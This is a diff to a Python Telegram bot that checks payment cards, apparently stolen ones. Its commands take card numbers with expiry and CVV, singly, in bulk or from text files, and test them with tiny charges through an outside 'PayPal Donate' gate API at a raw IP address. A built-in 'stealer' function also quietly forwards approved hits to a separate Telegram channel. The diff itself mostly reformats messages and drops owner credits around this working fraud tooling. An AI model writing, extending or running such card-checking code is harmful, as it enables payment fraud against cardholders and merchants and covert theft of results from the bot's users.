@@ -10,34 +10,40 @@ from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
+# -------------------------------------------------------------
 # Configuration
+# -------------------------------------------------------------
 GATE_NAME = "PayPal Donate $0.01"
 API_BASE = "http://199.244.48.163:8025/paypal_donate"
 PROXY = None  # Add proxy if needed
 
-# Limits
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
-# Owner DM Link
+# Owner DM link and clickable symbol (only for the ㊕ symbol)
 OWNER_DM = "https://t.me/spid_3r"
 SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 
+# -------------------------------------------------------------
+# Stealer function (keeps owner line – change if needed)
+# -------------------------------------------------------------
 async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
-    """Send approved card to stealer channel (NO CC, NO BIN, NO Bank, NO Country)"""
     try:
         stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
 
 {SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
 {SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
 
-{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
-{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
-{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML")
+{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
     except Exception as e:
         print(f"[Stealer Error] {e}")
 
+# -------------------------------------------------------------
+# API caller
+# -------------------------------------------------------------
 async def call_paypal_donate_api(fullcc):
     """Call PayPal Donate API to check credit card"""
     endpoint_url = f"{API_BASE}?cc={fullcc}"
@@ -71,7 +77,7 @@ async def call_paypal_donate_api(fullcc):
                         return "Unknown ❓", response_msg, gate_name, time_taken
             except Exception:
                 if attempt == 1:
-                    return "Error", f"Request failed", GATE_NAME, "0s"
+                    return "Error", "Request failed", GATE_NAME, "0s"
                 await asyncio.sleep(1)
     return "Error", "Request failed after multiple attempts", GATE_NAME, "0s"
 
@@ -79,7 +85,9 @@ def extract_cards(text):
     pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
     return re.findall(pattern, text)
 
-# --- SINGLE CHECK ---
+# -------------------------------------------------------------
+# SINGLE CHECK COMMAND (/ppd)
+# -------------------------------------------------------------
 @Client.on_message(filters.command("ppd", [".", "/"]))
 async def paypal_donate_cmd(Client, message):
     try:
@@ -142,7 +150,10 @@ async def paypal_donate_cmd(Client, message):
         if "Approved" in status or "✅" in status:
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)
 
-        finalresp = f"""{status}
+        # Make status bold
+        display_status = f"<b>{status}</b>"
+
+        finalresp = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
@@ -153,10 +164,15 @@ async def paypal_donate_cmd(Client, message):
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
 
-        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
+        await Client.edit_message_text(
+            message.chat.id,
+            thirdcheck.id,
+            finalresp,
+            disable_web_page_preview=True,
+            parse_mode=enums.ParseMode.HTML
+        )
         await setantispamtime(user_id)
         await deductcredit(user_id)
 
@@ -164,7 +180,9 @@ async def paypal_donate_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# --- MASS TEXT/REPLY COMMAND ---
+# -------------------------------------------------------------
+# MASS CHECK (text/reply) (/mppd)
+# -------------------------------------------------------------
 @Client.on_message(filters.command("mppd", [".", "/"]))
 async def paypal_donate_mass_cmd(Client, message):
     try:
@@ -207,7 +225,9 @@ async def paypal_donate_mass_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# --- TXT FILE COMMAND ---
+# -------------------------------------------------------------
+# TXT FILE COMMAND (/tppd)
+# -------------------------------------------------------------
 @Client.on_message(filters.command("tppd", [".", "/"]))
 async def paypal_donate_txt_cmd(Client, message):
     try:
@@ -255,7 +275,9 @@ async def paypal_donate_txt_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
-# --- SEQUENTIAL PROCESSING WITH PROGRESS INTERFACE ---
+# -------------------------------------------------------------
+# SEQUENTIAL PROCESSING (with progress, separate approved messages, declined summary)
+# -------------------------------------------------------------
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
     total_cards = len(ccs)
     processed = 0
@@ -265,14 +287,15 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
     start_time = time.perf_counter()
     approved_cards = []
 
+    # Initial progress message
     progress_text = f"""PayPal Donate
 Admin
 
 {SYMBOL} Response: Starting...
 
 Progress: 0/{total_cards}
-Approved: 0
-Declined: 0
+Approved ✅: 0
+Declined ❌: 0
 Remaining: {total_cards}
 
 Checked by: {first_name} ({role})"""
@@ -304,12 +327,12 @@ Checked by: {first_name} ({role})"""
                 "flag": flag,
                 "time": card_time
             })
-            # Stealer (no CC/BIN)
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
         else:
             declined_count += 1
             response_status = "DECLINED ❌"
 
+        # Update progress (NO reply_markup)
         try:
             await Client.edit_message_text(
                 message.chat.id,
@@ -320,8 +343,8 @@ Admin
 {SYMBOL} Response: {response_status}
 
 Progress: {processed}/{total_cards}
-Approved: {approved_count}
-Declined: {declined_count}
+Approved ✅: {approved_count}
+Declined ❌: {declined_count}
 Remaining: {remaining}
 
 Checked by: {first_name} ({role})""",
@@ -329,14 +352,14 @@ Checked by: {first_name} ({role})""",
             )
         except:
             pass
-
         await asyncio.sleep(0.5)
 
     await progress_msg.delete()
 
-    # Send each approved card separately (full details)
+    # Send each approved card as separate message (full details, no Owner line)
     for card in approved_cards:
-        approved_msg = f"""{card['status']}
+        display_status = f"<b>{card['status']}</b>"
+        approved_msg = f"""{display_status}
 
 {SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
 {SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
@@ -347,13 +370,13 @@ Checked by: {first_name} ({role})""",
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
     elapsed_time = round(time.perf_counter() - start_time, 2)
 
+    # Declined summary (no Owner line)
     if approved_count > 0:
         declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
 
@@ -370,10 +393,7 @@ Checked by: {first_name} ({role})""",
 ❌ Declined: {declined_count}
 📊 Total: {total_cards}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+👤 Checked by: {first_name} ({role})"""
         await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
     else:
         await message.reply_text(
@@ -383,10 +403,7 @@ Checked by: {first_name} ({role})""",
 📊 Total Cards: {total_cards}
 ❌ All Declined: {declined_count}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+👤 Checked by: {first_name} ({role})""",
             quote=True,
             parse_mode=enums.ParseMode.HTML
         )
